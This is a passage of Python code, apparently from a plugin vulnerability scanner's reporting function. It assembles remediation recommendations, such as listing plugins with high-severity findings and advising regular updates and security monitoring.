                'affected_plugins': list(set([v['plugin_name'] for v in high_vulns]))
            })
        
        # General recommendations
        if vulnerability_details:
            recommendations.append({
                'priority': 'GENERAL',
                'action': 'Regular security maintenance',
                'description': 'Implement regular plugin updates and security monitoring',
                'affected_plugins': []
            })
        
        return recommendations